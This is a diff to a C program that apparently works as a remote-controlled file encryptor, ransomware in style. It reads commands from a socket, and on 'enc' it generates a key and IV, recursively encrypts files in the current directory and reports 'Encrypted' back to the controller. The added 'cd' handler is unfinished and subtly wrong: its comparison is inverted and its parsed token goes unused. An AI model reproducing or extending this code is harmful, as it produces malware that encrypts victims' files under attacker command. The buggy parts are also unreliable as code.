@@ -64,13 +64,10 @@ int main (int argc, char * argv[])
 
             send(sockid, (const char *)path, strlen(path),0); //send the whole result once
         }
-        else if(strncmp(command,"enc",3) ==0)
+        else if(strncmp(command,"enc",3) ==0)   //Handle enc command
         {
-            FILE *out_fp;
-            char workindDirectory[1048];
-
-            out_fp = popen("/bin/pwd", "r");
-            fgets(workindDirectory, sizeof(workindDirectory), out_fp);
+            char cwd[1048];
+            getcwd(cwd, 1024);
 
             unsigned char key[33];
             int sizeKey = 33;
@@ -79,19 +76,22 @@ int main (int argc, char * argv[])
             char pKey[65];
             char pIv[65];
 	        int status = generate_key(key, sizeKey, iv, sizeIv, pKey, pIv);
-            printf("%s", workindDirectory);
-            int size = strcspn(workindDirectory, "\n");
-            char stripedWorkingDirectory[1048];                 //stripping \n from the workingDirectory
-            strncpy(stripedWorkingDirectory,workindDirectory,size); 
 
-            listdir((const char *)stripedWorkingDirectory, iv, key, 'e');
+            listdir((const char *)cwd, iv, key, 'e');
             
             char response[2048];
-            strcpy(response, stripedWorkingDirectory);
+            strcpy(response, cwd);
             strcat(response, "Encrypted");
 
 
             send(sockid, (const char *)response, strlen(response),0);
+            
+        }
+        else if(strncmp(command,"cd", 3))
+        {
+            const char * separator = " ";
+            char * strToken = strtok(command, separator);
+            strToken = strtok(NULL, separator);
             
         }
         
